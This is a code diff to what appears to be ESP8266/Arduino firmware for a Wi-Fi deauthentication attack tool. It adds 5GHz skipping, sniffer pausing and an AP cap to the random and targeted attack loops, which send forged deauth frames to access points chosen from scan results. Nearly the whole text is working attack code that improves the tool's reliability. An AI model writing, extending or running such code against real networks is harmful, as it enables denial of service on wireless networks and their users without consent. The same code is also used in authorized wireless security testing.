@@ -933,21 +933,29 @@ void handleCommand(String command) {
     if (!scan_results.empty()) {
       size_t idx = random(0, scan_results.size());
       uint8_t randChannel = scan_results[idx].channel;
-      wifi_set_channel(randChannel);
-      for (unsigned long j = 0; j < num_send_frames; j++) {
-        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, 2);
-        if (USE_LED) {
-          digitalWrite(LED_B, HIGH);
-          delay(50);
-          digitalWrite(LED_B, LOW);
+      // Skip 5GHz targets (raw injection there can wedge the radio) unless enabled.
+      if (randChannel >= 36 && !allow_5ghz_attack) {
+        sendResponse("[INFO] Random pick is a 5GHz AP " + scan_results[idx].ssid +
+                     " (ch " + String(randChannel) + "). Skipping. Enable with 'set attack_5ghz on'.");
+      } else {
+        bool wasSniffing = pauseSnifferForInjection();
+        wifi_set_channel(randChannel);
+        for (unsigned long j = 0; j < num_send_frames; j++) {
+          wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, 2);
+          if (USE_LED) {
+            digitalWrite(LED_B, HIGH);
+            delay(50);
+            digitalWrite(LED_B, LOW);
+          }
+          sendResponse("[RANDOM ATTACK] Deauth " + String(j + 1) + " => " + scan_results[idx].ssid +
+                       " on channel " + String(randChannel));
+
+          // Add small delay between frames to prevent stack overflow
+          delay(10);
+          // Feed watchdog to prevent resets during long attacks
+          yield();
         }
-        sendResponse("[RANDOM ATTACK] Deauth " + String(j + 1) + " => " + scan_results[idx].ssid +
-                     " on channel " + String(randChannel));
-        
-        // Add small delay between frames to prevent stack overflow
-        delay(10);
-        // Feed watchdog to prevent resets during long attacks
-        yield();
+        resumeSnifferAfterInjection(wasSniffing);
       }
     }
     else {
@@ -1304,7 +1312,25 @@ void handleCommand(String command) {
 void targetAttack() {
   if (target_mode && attack_enabled) {
     sendResponse("[INFO] Targeted attack started.");
-    for (size_t i = 0; i < target_aps.size(); i++) {
+
+    // Same protections as attackCycle(): cap AP count, pause the sniffer
+    // while injecting, and skip 5GHz APs unless explicitly enabled.
+    size_t maxAPs = min((size_t)20, target_aps.size());
+    if (target_aps.size() > 20) {
+      sendResponse("[INFO] Limiting targeted attack to first 20 APs to prevent system overload");
+    }
+
+    bool wasSniffing = pauseSnifferForInjection();
+
+    for (size_t i = 0; i < maxAPs; i++) {
+      // Raw injection uses the 2.4GHz TX path; injecting on a 5GHz channel is
+      // unreliable and can wedge the radio. Skip unless enabled.
+      if (target_aps[i].channel >= 36 && !allow_5ghz_attack) {
+        sendResponse("[INFO] Skipping 5GHz AP " + target_aps[i].ssid +
+                     " (ch " + String(target_aps[i].channel) + "). Enable with 'set attack_5ghz on'.");
+        continue;
+      }
+
       wifi_set_channel(target_aps[i].channel);
       for (unsigned long j = 0; j < num_send_frames; j++) {
         wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
@@ -1316,16 +1342,18 @@ void targetAttack() {
         sendResponse("[INFO] Deauth " + String(j + 1) + " => " + target_aps[i].ssid +
                      " (" + target_aps[i].bssid_str + ") on channel " +
                      String(target_aps[i].channel));
-        
+
         // Add small delay between frames to prevent stack overflow
         delay(10);
         // Feed watchdog to prevent resets during long attacks
         yield();
       }
-      
+
       // Add delay between APs to prevent overwhelming the system
       delay(25);
     }
+
+    resumeSnifferAfterInjection(wasSniffing);
     sendResponse("[INFO] Targeted attack completed.");
   }
 }
